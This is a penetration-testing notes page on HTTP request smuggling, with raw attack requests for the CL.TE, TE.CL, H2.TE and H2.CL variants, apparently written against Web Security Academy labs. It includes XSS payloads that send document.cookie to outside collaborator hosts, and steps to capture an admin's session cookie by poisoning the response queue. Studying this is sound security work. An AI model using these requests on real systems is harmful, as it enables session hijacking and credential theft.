---
title: Request Smuggling
source_url: https://notes.incendium.rocks/pentesting-notes/web/request-smuggling
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: web
---

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FAT34fKfzTHfRobGee30s%2Fsmuggling-http-request-to-back-end-server.svg?alt=media&amp;token=46234c0f-b25a-4a02-9ed2-ba41e3066955" alt=""><figcaption></figcaption></figure>

Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the `Content-Length` header and the `Transfer-Encoding` header.

Classic request smuggling attacks involve placing both the `Content-Length` header and the `Transfer-Encoding` header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:

* CL.TE: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
* TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
* TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

## CL.TE vulnerabilities <a href="#cl-te-vulnerabilities" id="cl-te-vulnerabilities"></a>

Here, the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.&#x20;

### Identification

If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following will often cause a time delay:

{% code lineNumbers="true" %}

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

{% endcode %}

Since the front-end server uses the `Content-Length` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Transfer-Encoding` header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.

### Exploitation

Manually fixing the length fields in request smuggling attacks can be tricky. I recommend to install the "HTTP Request Smuggler" extension for Burp Suite from the BApp store.

#### XSS Example with User-Agent being reflected in page

{% code lineNumbers="true" %}

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 240
Transfer-Encoding: chunked

0

GET /post?postId=9 HTTP/1.1
User-Agent: a"/><script>fetch('https://qwq0upci2mjrsd9l4cesv43b42atyumj.oastify.com/steal?cookie='+btoa(document.cookie));</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

x=1
```

{% endcode %}

## TE.CL vulnerabilities <a href="#te-cl-vulnerabilities" id="te-cl-vulnerabilities"></a>

Here, the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. If an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the following will often cause a time delay:

{% code lineNumbers="true" %}

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

{% endcode %}

Since the front-end server uses the `Transfer-Encoding` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Content-Length` header, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay.

### Exploitation

Manually fixing the length fields in request smuggling attacks can be tricky. I recommend to install the "HTTP Request Smuggler" extension for Burp Suite from the BApp store.

#### XSS Example with User-Agent being reflected in page

{% code lineNumbers="true" %}

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

ea
GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>fetch('https://z4492ykravr00mhuclm13dbkcbi260up.oastify.com/steal?cookie='+btoa(document.cookie));</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=
0
```

{% endcode %}

## HTTP/2 Request Smuggling

Although you won't see this in Burp, HTTP/2 messages are sent over the wire as a series of separate "frames". Each frame is preceded by an explicit length field, which tells the server exactly how many bytes to read in. Therefore, the length of the request is the sum of its frame lengths.

In theory, this mechanism means there is no opportunity for an attacker to introduce the ambiguity required for request smuggling, as long as the website uses HTTP/2 end to end. In the wild, however, this is often not the case due to the widespread but dangerous practice of HTTP/2 downgrading.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FidThf17579YQCf9lS0jv%2Fhttp2-downgrading.jpg?alt=media&amp;token=1928e7bc-af62-4f9c-80a5-1244c5d5cc12" alt=""><figcaption></figcaption></figure>

### H2.TE identification

{% code lineNumbers="true" %}

```http
POST / HTTP/2
Host: 0a2a00e4047ca1b18381b51f00900029.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED
```

{% endcode %}

Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

### Response queue poisoning via H2.TE

After identifying the H2.TE vulnerability, we can aim for capturing a login request for another user. We do this by poisoning the response queue. In Burp Repeater, create the following request, which smuggles a complete request to the back-end server. Note that the path in both requests points to a non-existent endpoint. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured.

{% code lineNumbers="true" %}

```http
POST /x HTTP/2
Host: 0a2a00e4047ca1b18381b51f00900029.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: 0a2a00e4047ca1b18381b51f00900029.web-security-academy.net

```

{% endcode %}

Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.

We can automate this process in intruder!

1. Leave payload as it is
2. Select sniper attack
3. Select payload type "null payloads" and continue indefinitely
4. In settings, unmark "update content-length header"
5. In resource pool set the maximum concurrent request to 1 and delay between requests 800 milliseconds (just under a second).
6. Filter for 3xx responses to only get the 302 containing the cookie.

### H2.CL identification

{% code lineNumbers="true" %}

```http
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

SMUGGLED
```

{% endcode %}

Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
